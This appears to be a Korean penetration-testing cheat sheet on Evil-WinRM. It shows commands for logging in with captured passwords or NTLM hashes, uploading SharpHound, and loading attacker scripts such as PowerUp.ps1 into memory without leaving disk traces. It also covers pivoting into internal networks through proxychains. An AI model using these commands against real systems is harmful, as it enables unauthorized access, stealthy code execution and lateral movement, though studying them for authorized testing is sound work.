---
layout: page
title: evil-winrm
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

# Evil-WinRM 원격 접속 가이드

WinRM(Windows Remote Management)은 5985(HTTP) 및 5986(HTTPS) 포트를 통해 Windows 시스템을 원격으로 관리하기 위한 표준 프로토콜입니다. `Evil-WinRM`은 이 WinRM을 위한 강력하고 편리한 클라이언트로, PowerShell 기반의 완전한 기능의 셸을 제공합니다.

---

### **1. 기본 접속 방법**

- **목표:** 획득한 자격증명을 사용하여 대상 시스템에 원격 PowerShell 세션을 설정합니다.

```bash
# -i: 타겟 IP 주소
# -u: 사용자 이름
# -p: 비밀번호
evil-winrm -i $target -u 'Administrator' -p 'Password123!'
```

```bash
# -H: NTLM 해시
evil-winrm -i $target -u 'Administrator' -H 'c2597747aa5e43022a3a3049a3c3b09d'
```

---

### **2. 핵심 기능: 파일 전송 및 스크립트 로딩**

`Evil-WinRM`의 가장 큰 장점 중 하나는 파일 전송과 스크립트 실행이 매우 간편하다는 것입니다.

#### **파일 업로드/다운로드**

세션이 연결된 상태에서 다음 명령어를 사용할 수 있습니다.

```powershell
# 공격자 머신의 파일을 타겟으로 업로드
# 형식: upload <local_path> <remote_path>
upload /root/SharpHound.ps1 C:\Users\Public\SharpHound.ps1

# 타겟의 파일을 공격자 머신으로 다운로드
# 형식: download <remote_path> <local_path>
download C:\Windows\System32\drivers\etc\hosts .
```

#### **로컬 스크립트 디렉터리 공유**

`-s` 옵션을 사용하면 공격자 머신의 특정 디렉터리를 타겟 시스템에 웹 서버 형태로 공유할 수 있어, 파일을 디스크에 직접 쓰지 않고도 스크립트를 실행할 수 있습니다.

```bash
# 공격자의 /root/scripts 폴더를 공유하며 접속
evil-winrm -i $target -u <user> -p <pass> -s /root/scripts
```

- 접속 후, `Evil-WinRM`은 자동으로 공유된 디렉터리에 접근할 수 있는 PowerShell 다운로드 명령어를 화면에 보여줍니다. 이를 복사하여 세션에 붙여넣으면, 디스크 흔적 없이 `PowerUp.ps1` 같은 스크립트를 메모리에서 바로 실행할 수 있습니다.

---

### **3. Proxychains 연동 (피버팅)**

`Evil-WinRM`은 `proxychains`와 완벽하게 호환되어, 이미 침투한 다른 시스템을 경유하여 내부망의 다른 시스템에 접속(피버팅)할 때 매우 유용합니다.

```bash
proxychains evil-winrm -i $internal_target_ip -u <user> -p <pass>
```



